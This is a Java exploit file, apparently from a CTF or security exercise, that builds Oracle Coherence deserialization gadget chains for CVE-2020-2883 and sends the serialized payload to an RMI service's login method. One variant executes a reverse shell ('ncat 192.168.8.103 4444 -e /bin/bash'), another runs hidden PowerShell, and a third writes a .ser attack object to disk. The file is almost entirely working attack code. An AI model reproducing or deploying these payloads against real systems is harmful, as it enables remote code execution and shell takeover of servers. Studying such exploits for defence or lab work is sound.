import com.sleepycat.persist.evolve.Mutations;
import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.dev.component.Extractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import javafx.scene.effect.Reflection;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.PriorityQueue;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentNavigableMap;
import java.util.concurrent.ConcurrentSkipListMap;

public class ASCISPlayer {
    public ASCISPlayer() {
    }

    public static Object CVE_2020_2883_v1() throws IOException, NotBoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, Exception {
        /**
         * javax.management.BadAttributeValueExpException.readObject()
         *   com.tangosol.internal.sleepycat.persist.evolve.Mutations.toString()
         *     java.util.concurrent.ConcurrentSkipListMap$SubMap.size()
         *     java.util.concurrent.ConcurrentSkipListMap$SubMap.isBeforeEnd()
         *       java.util.concurrent.ConcurrentSkipListMap.cpr()
         *         com.tangosol.util.comparator.ExtractorComparator.compare()
         *           com.tangosol.util.extractor.ChainedExtractor.extract()
         *           com.tangosol.util.extractor.ReflectionExtractor().extract()
         *             Method.invoke()
         *             //...
         *           com.tangosol.util.extractor.ReflectionExtractor().extract()
         *             Method.invoke()
         *               Runtime.exec()
         */


        String command = "cmd.exe";
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ConstantExtractor(Runtime.class),
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{command,"/c","notepad.exe"})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        ConcurrentSkipListMap concurrentSkipListMap = new ConcurrentSkipListMap<String, String>();
        Field comparator = concurrentSkipListMap.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(concurrentSkipListMap, extractorComparator);

        ConcurrentNavigableMap subMap = concurrentSkipListMap.subMap("foo", false, "bar", false);

        // crafted Mutations Object
        Mutations mutations = new Mutations();
        Field renamers = mutations.getClass().getDeclaredField("renamers");
        renamers.setAccessible(true);
        renamers.set(mutations, subMap);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, mutations);

        FileOutputStream fos = new FileOutputStream("CVE_2020_2883_v1.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(val);
        os.close();

        return val;
    }

    public static void CVE_2020_2883_v3() throws Exception{




        ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});
        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"cmd.exe", "/c", "powershell.exe -nop -w hidden -noni -c \"notepad.exe\" "}});

        ReflectionExtractor extractors[] = {extractor, extractor2, extractor3};
        ChainedExtractor chainedExt = new ChainedExtractor(extractors);

    }

    public static Object CVE_2020_2883_v2()throws  IOException, NotBoundException, NoSuchFieldException, IllegalAccessException{

        /**
         * java.util.PriorityQueue.readObject()
         *   java.util.PriorityQueue.heapify()
         *   java.util.PriorityQueue.siftDown()
         *   java.util.PriorityQueue.siftDownUsingComparator()
         *   com.tangosol.util.extractor.AbstractExtractor.compare()
         *     com.tangosol.util.extractor.MultiExtractor.extract()
         *       com.tangosol.util.extractor.ChainedExtractor.extract()
         *         //...
         *         Method.invoke()
         *             //...
         *           Runtime.exec()
         */

        ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});
        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"/bin/sh", "-c", "ncat 192.168.8.103 4444 -e /bin/bash"}});


        ValueExtractor[] valueExtractors = new ValueExtractor[]{ new ConstantExtractor(Runtime.class),extractor, extractor2, extractor3};

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("foo");
        priorityQueue.add("bar");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, extractorComparator);

        return priorityQueue;
    }

    public static void WriteAttackObj(Object attackObj, String fileName) throws IOException {
        FileOutputStream fos = new FileOutputStream(fileName);
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(attackObj);
        os.close();
    }


    public static void main(String[] args) throws IOException, NotBoundException, NoSuchFieldException, IllegalAccessException, Exception {

        //Object attackObj = (BadAttributeValueExpException) CVE_2020_2883_v1();
        Object attackObj = (PriorityQueue) CVE_2020_2883_v2();

        WriteAttackObj(attackObj, "CVE_2020_2883_v1.ser");

        String serverIP = "127.0.0.1";
        int serverPort = Integer.parseInt("1990");
        Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
        ASCISInterf ascisInterf = (ASCISInterf) registry.lookup("ascis");

        try {
            ascisInterf.login(attackObj);
        } catch (Exception e) {

        }
    }
}
